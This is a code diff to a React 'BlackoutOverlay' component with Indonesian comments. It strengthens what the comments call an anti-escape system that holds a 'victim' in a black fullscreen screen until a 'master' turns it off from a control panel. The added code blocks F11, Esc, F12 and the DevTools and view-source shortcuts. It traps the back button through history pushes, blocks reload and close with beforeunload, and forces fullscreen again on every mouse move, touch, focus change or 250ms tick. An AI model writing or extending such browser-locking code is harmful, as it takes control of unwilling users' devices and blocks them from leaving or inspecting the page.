@@ -72,11 +72,12 @@ export default function BlackoutOverlay() {
     });
   }, [setB]);
 
-  // Kunci layar penuh selama blackout: browser cuma mau masuk fullscreen saat
-  // ada gerakan user, jadi kita minta ulang tiap kali korban klik/ketuk/scroll
-  // atau tekan tombol apa pun. F11/Esc/F10 di-block (preventDefault) di fase
-  // capture biar keduluan; interval 500ms menjaga kalau ada event yg lewat.
-  // Status hitam nggak ada timer — bertahan sampai master matikan dari panel.
+  // ---- SISTEM ANTI-KABUR ----
+  // Blokir semua jalan keluar: F11/F12/Esc/F10 & combo DevTools (Ctrl+Shift+I/J/C,
+  // Ctrl+U/P/S), tombol back (history trap), reload/close (beforeunload),
+  // contextmenu, scroll, seleksi. Setiap interaksi korban langsung balik
+  // fullscreen (<1 detik) — interval 250ms + setTimeout(0) di dalam jendela
+  // user-activation (~5 dtk) menjamin layar selalu penuh.
   useEffect(() => {
     if (!blacked) return;
 
@@ -90,19 +91,23 @@ export default function BlackoutOverlay() {
       }
     };
 
+    const HARD = new Set(['f11', 'f12', 'escape', 'f10']);
+    const COMBO = new Set(['i', 'j', 'c', 'u', 'p', 's']);
+
     const onKey = (e: KeyboardEvent) => {
-      if (e.key === 'F11' || e.key === 'Escape' || e.key === 'F10') {
+      const k = (e.key || '').toLowerCase();
+      const blocked = HARD.has(k) || ((e.ctrlKey || e.metaKey) && COMBO.has(k));
+      if (blocked) {
         e.preventDefault();
         e.stopPropagation();
-        // Balik fullscreen dalam jendela user-activation (transient ~5 detik),
-        // jadi walaupun browser sempat keluar fullscreen, langsung masuk lagi.
         window.setTimeout(enter, 0);
       }
       enter();
     };
 
     const onKeyUp = (e: KeyboardEvent) => {
-      if (e.key === 'F11' || e.key === 'Escape' || e.key === 'F10') {
+      const k = (e.key || '').toLowerCase();
+      if (HARD.has(k) || ((e.ctrlKey || e.metaKey) && COMBO.has(k))) {
         e.preventDefault();
       }
     };
@@ -114,22 +119,45 @@ export default function BlackoutOverlay() {
     const onCtx = (e: Event) => e.preventDefault();
     const onTouch = () => enter();
     const onWheel = () => enter();
+    const onMove = () => enter();
     const onResize = () => {
       window.scrollTo(0, 0);
       enter();
     };
 
+    // Tombol Back / mouse back = jebakan: tiap popstate, dorong state baru.
+    const trapBack = () => {
+      try {
+        window.history.pushState({ nexus: true }, '');
+      } catch {
+        /* noop */
+      }
+    };
+
+    const onBeforeUnload = (e: BeforeUnloadEvent) => {
+      e.preventDefault();
+      e.returnValue = '';
+    };
+
     enter();
-    const id = window.setInterval(enter, 300);
+    trapBack();
+    const id = window.setInterval(enter, 250);
     window.addEventListener('keydown', onKey, true);
     document.addEventListener('keydown', onKey, true);
     window.addEventListener('keyup', onKeyUp, true);
     document.addEventListener('keyup', onKeyUp, true);
     document.addEventListener('pointerdown', enter);
     document.addEventListener('touchstart', onTouch);
+    document.addEventListener('touchmove', onTouch);
     document.addEventListener('wheel', onWheel);
+    document.addEventListener('mousemove', onMove);
     document.addEventListener('fullscreenchange', onFullscreen);
     document.addEventListener('contextmenu', onCtx);
+    document.addEventListener('visibilitychange', enter);
+    window.addEventListener('focus', enter);
+    window.addEventListener('pageshow', enter);
+    window.addEventListener('popstate', trapBack);
+    window.addEventListener('beforeunload', onBeforeUnload);
     window.addEventListener('resize', onResize);
     return () => {
       clearInterval(id);
@@ -139,9 +167,16 @@ export default function BlackoutOverlay() {
       document.removeEventListener('keyup', onKeyUp, true);
       document.removeEventListener('pointerdown', enter);
       document.removeEventListener('touchstart', onTouch);
+      document.removeEventListener('touchmove', onTouch);
       document.removeEventListener('wheel', onWheel);
+      document.removeEventListener('mousemove', onMove);
       document.removeEventListener('fullscreenchange', onFullscreen);
       document.removeEventListener('contextmenu', onCtx);
+      document.removeEventListener('visibilitychange', enter);
+      window.removeEventListener('focus', enter);
+      window.removeEventListener('pageshow', enter);
+      window.removeEventListener('popstate', trapBack);
+      window.removeEventListener('beforeunload', onBeforeUnload);
       window.removeEventListener('resize', onResize);
     };
   }, [blacked]);
